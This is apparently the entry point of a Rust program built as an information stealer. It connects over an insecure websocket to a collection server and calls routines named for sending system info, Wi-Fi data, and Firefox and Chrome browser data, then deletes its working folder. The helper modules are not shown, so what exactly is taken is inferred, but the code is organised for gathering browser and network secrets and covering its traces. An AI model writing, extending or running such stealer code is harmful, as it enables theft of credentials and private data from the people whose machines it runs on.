use uuid::Uuid;
use websocket::{ClientBuilder};
use std::fs;

#[path = "./core_services/services.rs"]
mod services;

#[path = "./core_services/browsers.rs"]
mod browsers;

fn main() {
    let tx_id: Uuid = uuid::Uuid::new_v4();

    fs::create_dir_all("./shared").unwrap();

    let server = &mut ClientBuilder::new("ws://127.0.0.1:50001")
        .unwrap()
        .connect_insecure()
        .unwrap();
    
    services::send_system_info(tx_id, server);
    services::send_wifi_data(tx_id, server);
    services::send_firefox(tx_id, server);
    services::send_google_chrome(tx_id, server);

    fs::remove_dir_all(format!("./shared/{}", tx_id.to_string())).unwrap();
}

